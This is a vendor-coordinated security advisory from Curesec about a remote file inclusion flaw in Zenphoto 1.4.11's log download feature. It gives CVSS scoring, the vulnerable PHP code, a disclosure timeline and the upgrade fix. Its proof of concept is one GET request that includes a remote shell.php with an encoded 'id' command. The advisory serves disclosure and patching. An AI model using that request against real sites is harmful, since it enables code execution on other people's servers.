@@ -1,0 +1,105 @@
+Security Advisory - Curesec Research Team
+
+1. Introduction
+
+Affected Product:   Zenphoto 1.4.11
+Fixed in:           1.4.12
+Fixed Version Link: https://github.com/zenphoto/zenphoto/archive/
+                    zenphoto-1.4.12.zip
+Vendor Website:     http://www.zenphoto.org/
+Vulnerability Type: RFI
+Remote Exploitable: Yes
+Reported to vendor: 01/29/2016
+Disclosed to        03/15/2016
+public:
+Release mode:       Coordinated Release
+CVE:                n/a
+Credits             Tim Coen of Curesec GmbH
+
+2. Overview
+
+Zenphoto is a CMS for hosting images, written in PHP. In version 1.4.11, it is
+vulnerable to remote file inclusion. An admin account is required.
+
+3. Details
+
+Description
+
+CVSS: High 8.5 AV:N/AC:M/Au:S/C:C/I:C/A:C
+
+When downloading a log file, the input is not properly sanitized, leading to
+RFI.
+
+An admin account is required, and allow_url_fopen must be set to true - which
+is the default setting.
+
+In old versions of PHP, this would additionally lead to LFI via null byte
+poisoning or path expansion, regardless of allow_url_fopen settings.
+
+Proof of Concept
+
+GET /zenphoto-zenphoto-1.4.11/zp-core/admin-logs.php?action=download_log&page=
+logs&tab=http://localhost/shell.php%3f%78%3d%69%64%26%66%6f%6f%3d&filename=
+security&XSRFToken=afd5bafed21279d837486fd2beea81f87bc29dea HTTP/1.1
+
+Code
+
+// admin-logs.php (sanitize(x, 3) only strips out tags)
+    case 'download_log':
+	    $zipname = sanitize($_GET['tab'], 3) . '.zip';
+	    if (class_exists('ZipArchive')) {
+		    $zip = new ZipArchive;
+		    $zip->open($zipname, ZipArchive::CREATE);
+		    $zip->addFile($file, basename($file));
+		    $zip->close();
+		    ob_get_clean();
+		    header("Pragma: public");
+		    header("Expires: 0");
+		    header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
+		    header("Cache-Control: private", false);
+		    header("Content-Type: application/zip");
+		    header("Content-Disposition: attachment; filename=" . basename($zipname) . ";" );
+		    header("Content-Transfer-Encoding: binary");
+		    header("Content-Length: " . filesize($zipname));
+		    readfile($zipname);
+		    // remove zip file from temp path
+		    unlink($zipname);
+		    exit;
+	    } else {
+		    include_once(SERVERPATH . '/' . ZENFOLDER . '/lib-zipStream.php');
+		    $zip = new ZipStream($zipname);
+		    $zip->add_file_from_path(internalToFilesystem(basename($file)),internalToFilesystem($file));
+		    $zip->finish();
+	    }
+	    break;
+
+4. Solution
+
+To mitigate this issue please upgrade at least to version 1.4.12:
+
+https://github.com/zenphoto/zenphoto/archive/zenphoto-1.4.12.zip
+
+Please note that a newer version might already be available.
+
+5. Report Timeline
+
+01/29/2016 Informed Vendor about Issue
+01/29/2016 Vendor replies
+02/23/2016 Vendor sends fix for verification
+02/23/2016 Suggested improvements for attempted fix
+02/29/2016 Delayed Disclosure
+03/14/2016 Vendor releases fix
+03/15/2016 Disclosed to public
+
+
+Blog Reference:
+https://blog.curesec.com/article/blog/Zenphoto-1411-RFI-156.html
+ 
+--
+blog:  https://blog.curesec.com
+tweet: https://twitter.com/curesec
+
+Curesec GmbH
+Curesec Research Team
+Romain-Rolland-Str 14-24
+13089 Berlin, Germany
